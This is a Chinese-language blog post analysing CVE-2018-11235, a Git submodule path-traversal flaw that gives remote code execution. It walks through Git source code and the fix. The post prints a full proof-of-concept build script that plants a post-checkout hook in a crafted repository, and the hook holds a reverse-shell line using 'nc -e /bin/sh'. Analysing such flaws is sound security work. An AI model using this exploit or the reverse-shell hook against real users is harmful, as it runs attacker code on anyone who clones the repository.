<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">

<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






  <meta name="baidu-site-verification" content="cqIhQLk06F" />







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="命令执行,git,submodule," />





  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="RCE with Git submodule 分析-【CVE-2018-11235】">
<meta property="og:type" content="article">
<meta property="og:title" content="RCE with Git submodule分析-【CVE-2018-11235】">
<meta property="og:url" content="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/index.html">
<meta property="og:site_name" content="Chybeta">
<meta property="og:description" content="RCE with Git submodule 分析-【CVE-2018-11235】">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png">
<meta property="og:updated_time" content="2018-07-05T00:33:24.276Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RCE with Git submodule分析-【CVE-2018-11235】">
<meta name="twitter:description" content="RCE with Git submodule 分析-【CVE-2018-11235】">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/"/>





  <title> RCE with Git submodule分析-【CVE-2018-11235】 | Chybeta </title>
  <meta name="baidu_union_verify" content="4dcd229ee2a964611d56cf139346dc50"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  


<!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-121975637-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Chybeta</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-link">
          <a href="/link" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
            
            朋友
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                RCE with Git submodule分析-【CVE-2018-11235】
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-31T16:25:02+08:00">
                2018-05-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Bin-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Bin Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/" class="leancloud_visitors" data-flag-title="RCE with Git submodule分析-【CVE-2018-11235】">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><a href="https://xz.aliyun.com/t/2371" target="_blank" rel="external">RCE with Git submodule 分析-【CVE-2018-11235】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png" alt="1.png"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Github上已经放出了<a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a>，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见<a href="https://github.com/CHYbeta/CVE-2018-11235-DEMO" target="_blank" rel="external">CVE-2018-11235-DEMO</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git</div><div class="line">./build.sh</div></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif" alt="demo.gif"></p>
<p>个人本地测试Git版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu  ~/CVE-2018-11235  git --version</div><div class="line">git version 2.17.0</div></pre></td></tr></table></figure></p>
<p>其中 build.sh　主要内容如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">set</span> <span class="_">-e</span></div><div class="line"></div><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div><div class="line"></div><div class="line">repo_par=<span class="string">"<span class="variable">$PWD</span>/repo_par"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"></div><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div><div class="line"></div><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div><div class="line"></div><div class="line">git config <span class="_">-f</span> .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div><div class="line"></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span></div><div class="line"></div><div class="line">git commit -m <span class="string">"CVE-2018-11235"</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"git clone --recurse-submodules \"<span class="variable">$repo_par</span>\" dest_dir"</span></div></pre></td></tr></table></figure></p>
<p>vuln.sh:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">nc -e /bin/sh 127.0.0.1 12345</div></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在Git中存在<a href="https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9" target="_blank" rel="external">Git Hooks</a>的操作，它们被存放在一个repo的<code>.git</code>目录下的hooks文件目录下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png" alt="2.png"></p>
<p>当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以<code>post-checkout</code>挂钩为例，如果在hooks中存在一个<code>post-checkout</code>脚本，则当在该repo中执行<code>git checkout</code>指令时，则会自动的去执行hooks目录下的<code>post-checkout</code>脚本。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png" alt="3.png"></p>
<p>正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有<code>post-checkout</code>脚本的:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png" alt="4.png"></p>
<p>而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。</p>
<p>先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。</p>
<p>以前面的build.sh中的内容为例：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
<p>这里我们创建了一个仓库repo_sub，接着通过<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div></pre></td></tr></table></figure></p>
<p>将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径<code>vuln</code>(即别名)。</p>
<p>在<a href="https://git-scm.com/docs/gitsubmodules" target="_blank" rel="external">Git文档:gitsubmodules</a>中提到：</p>
<blockquote>
<blockquote>
<p>On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i).</p>
</blockquote>
</blockquote>
<p>对于子模块而言，通常情况下，子模块的Git目录存放在<code>$GIT_DIR/modules/</code>中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个<code>.git</code>文件来指向其Git目录。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png" alt="7.png"></p>
<p>当添加子模块完成后，在repo_par中会出现<code>.gitmodules</code>文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png" alt="5.png"></p>
<p><code>.gitmodules</code>文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见<a href="https://git-scm.com/docs/gitmodules" target="_blank" rel="external">官方文档gitmodules</a>：</p>
<p>这里对子模块<code>vuln</code>而言，它的<code>name</code>就是<code>vuln</code>,<code>path</code>就是<code>vuln</code>,url即为<code>./../repo_sub</code>。关于这个name，在官方文档中有这样一些表述：</p>
<blockquote>
<blockquote>
<p>The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys….</p>
</blockquote>
</blockquote>
<p>接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从<code>.gitmodules</code>文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行<code>gitmodules_cb</code>的最后将会调用<code>parse_config</code>对<code>.gitmodules</code>进行解析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gitmodules_cb</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> repository *repo = data;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter parameter;</div><div class="line"></div><div class="line">	parameter.cache = repo-&gt;submodule_cache;</div><div class="line">	parameter.treeish_name = <span class="literal">NULL</span>;</div><div class="line">	parameter.gitmodules_sha1 = null_sha1;</div><div class="line">	parameter.overwrite = <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> parse_config(var, value, &amp;parameter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>submodule-config.c第362行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parse_config</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter *me = data;</div><div class="line">	<span class="keyword">struct</span> submodule *submodule;</div><div class="line">	<span class="keyword">struct</span> strbuf name = STRBUF_INIT, item = STRBUF_INIT;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* this also ensures that we only parse submodule entries */</span></div><div class="line">	<span class="keyword">if</span> (!name_and_item_from_var(var, &amp;name, &amp;item))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">   	submodule = lookup_or_create_by_name(me-&gt;cache,</div><div class="line">					     me-&gt;gitmodules_sha1,</div><div class="line">					     name.buf);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>name_and_item_from_var(var, &amp;name, &amp;item)</code>用于从变量<code>var</code>中获得name值，具体代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submodule-config.c</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">name_and_item_from_var</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">struct</span> strbuf *name,</span></span></div><div class="line">				  <span class="keyword">struct</span> strbuf *item)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *subsection, *key;</div><div class="line">	<span class="keyword">int</span> subsection_len, parse;</div><div class="line">	parse = parse_config_key(var, <span class="string">"submodule"</span>, &amp;subsection,</div><div class="line">			&amp;subsection_len, &amp;key);</div><div class="line">	<span class="keyword">if</span> (parse &lt; <span class="number">0</span> || !subsection)</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	strbuf_add(name, subsection, subsection_len);</div><div class="line">	strbuf_addstr(item, key);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>假设<code>.gitmodules</code>中内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[submodule &quot;vuln&quot;]</div><div class="line">	path = vuln</div><div class="line">	url = ./../repo_sub</div></pre></td></tr></table></figure></p>
<p>则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为<code>vuln</code></p>
<p>回到<code>parse_config</code>中，此后将通过<code>lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)</code>获取子模块的信息并进行一系列操作。</p>
<p>在 <code>submodule.c</code>第1617行，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">submodule_move_head</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *old_head,</div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *new_head,</div><div class="line">			 <span class="keyword">unsigned</span> flags)</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 第 1617 行</span></div><div class="line">	<span class="keyword">if</span> (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123;</div><div class="line">		<span class="keyword">if</span> (old_head) &#123;</div><div class="line">			<span class="keyword">if</span> (!submodule_uses_gitfile(path))</div><div class="line">				absorb_git_dir_into_superproject(<span class="string">""</span>, path,</div><div class="line">					ABSORB_GITDIR_RECURSE_SUBMODULES);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line"></div><div class="line">			<span class="comment">/* make sure the index is clean as well */</span></div><div class="line">			submodule_reset_index(path);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这通过<code>xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)</code>来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，<code>get_git_common_dir</code>即父repo的Git目录，即<code>.git</code>。<code>sub-&gt;name</code>即前面获得的name值。拼接完成后子模块的Git目录即为<code>.git/modules/vuln</code></p>
<p>但从前面的代码看来，对于<code>name</code>和<code>sub-&gt;name</code>，Git并没有做相关的输入检查/路径检查。如果我们通过设置<code>name</code>为<code>../../vuln</code>，则拼接后的路径即<code>.git/modules/../../vuln</code>，即当前目录下的<code>vuln</code>目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的<code>vuln</code>目录当做子模块的Git目录。</p>
<p>前面说到，<code>.git/hooks</code>目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式:</p>
<ol>
<li>将目录<code>.git/modules/vuln</code>拷贝到当前目录<code>modules</code>下。</li>
<li>往<code>modules/vuln</code>目录中的hooks目录添加hook脚本</li>
<li>构造子模块，使其name成为<code>../../modules/vuln</code>，使子模块的Git目录信息指向当前目录下<code>module/vuln</code></li>
<li>构造repo，使其在git clone时触发hook脚本</li>
</ol>
<p>先考虑前2条，即对应build.sh中下述代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png" alt="8.png"></p>
<p>第三条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png" alt="9.png"></p>
<p>第四点，为了让<code>.git/modules/../../modules/vuln</code>即<code>modules/vuln</code>下的hooks目录中的hook脚本被调用，执行下述语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule add &quot;$repo_submodule&quot;</div><div class="line">git commit -m &quot;CVE-2018-11235&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png" alt="10.png"></p>
<p>再添加一个子模块。当Git地进行<code>git clone --recurse-submodules</code>时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png" alt="11.png"></p>
<p>上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 <a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">CVE-2018-11235 - Quick &amp; Dirty PoC</a></p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>补丁见：<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44" target="_blank" rel="external">https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44</a></p>
<p>主要是对从<code>.gitmodules</code>中获取的name进行了检查</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png" alt="12.png"></p>
<p>在<code>name_and_item_from_var(var, &amp;name, &amp;item)</code>函数中调用了<code>check_submodule_name</code>来进行检查：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbd119f2-67bd-1.png" alt="13.png"></p>
<p>Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。</p>
